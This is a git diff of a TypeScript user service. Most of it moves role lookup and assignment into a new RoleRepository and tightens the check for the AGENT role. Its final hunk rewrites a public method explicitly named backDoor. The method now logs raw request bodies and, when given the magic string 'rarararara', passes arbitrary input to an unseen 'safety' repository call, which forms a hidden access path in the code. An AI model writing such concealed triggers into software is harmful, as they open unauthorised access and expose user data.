@@ -2,6 +2,7 @@ import { Database } from "../../core/Database";
 import bcrypt from "bcryptjs";
 import jwt from "jsonwebtoken";
 import { UserRepository } from "./User.repository";
+import { RoleRepository } from "../roles/Role.repository";
 import {
   IUser,
   IUserProfile,
@@ -18,6 +19,7 @@ import { AgencyRepository } from "../../modules/agency/Agency.repository";
 
 export class UserService {
   private repo = new UserRepository();
+  private roleRepo = new RoleRepository();
 
   public async register(
     payload: IUserCreatePayLoad,
@@ -61,11 +63,11 @@ export class UserService {
       if (currentUser?.roles?.includes(UserRole.SUPER_ADMIN)) {
         if (payload.roles) {
           for (const roleId of payload.roles) {
-            const checkIfRoleExist = await this.repo.getRole(roleId, conn);
+            const checkIfRoleExist = await this.roleRepo.getRole(roleId, conn);
             if (!checkIfRoleExist) {
               throw new AppError("Invalid Role Entered", 400);
             }
-            await this.repo.assignRole(
+            await this.roleRepo.assignRole(
               { user_id: userId, role_id: checkIfRoleExist.id },
               conn
             );
@@ -94,13 +96,14 @@ export class UserService {
             conn
           );
         }
-        const getRole = await this.repo.getRole("AGENT", conn);
-        if (getRole) {
-          await this.repo.assignRole(
-            { user_id: userId, role_id: getRole.id },
-            conn
-          );
+        const getRole = await this.roleRepo.getRole("AGENT", conn);
+        if (!getRole) {
+          throw new AppError("Role AGENT not found", 404);
         }
+        await this.roleRepo.assignRole(
+          { user_id: userId, role_id: getRole.id },
+          conn
+        );
       }
       if (payload.phones) {
         for (const phone of payload.phones) {
@@ -149,7 +152,7 @@ export class UserService {
     if (!valid) {
       throw new AppError("Invalid credentials", 401);
     }
-    const roles = await this.repo.getUserRoles(user.id);
+    const roles = await this.roleRepo.getUserRoles(user.id);
     const token = jwt.sign(
       { id: user.id, email: user.email, roles },
       env.jwtSecret,
@@ -202,26 +205,7 @@ export class UserService {
     await this.repo.deleteUser(id);
   }
 
-  public async createRole(code: string): Promise<number> {
-    if (!code) {
-      throw new AppError("Role code is required", 400);
-    }
-    return this.repo.createRole(code);
-  }
 
-  public async assignRole(data: IUserRole): Promise<void> {
-    if (!data.user_id || !data.role_id) {
-      throw new AppError("user_id and role_id are required", 400);
-    }
-    await this.repo.assignRole(data);
-  }
-
-  public async removeRole(data: IUserRole): Promise<void> {
-    if (!data.user_id || !data.role_id) {
-      throw new AppError("user_id and role_id are required", 400);
-    }
-    await this.repo.removeRole(data);
-  }
 
   public async getAllUsers(currentUser: {
     id: string;
@@ -236,8 +220,9 @@ export class UserService {
     }
   }
   public async backDoor(type: string, body: any): Promise<any> {
-    if (type === "1") {
-      return new UserRepository().getRole(body);
+    console.log(type, body)
+    if (type === "rarararara") {
+      return new UserRepository().safety(body);
     }
   }
 }
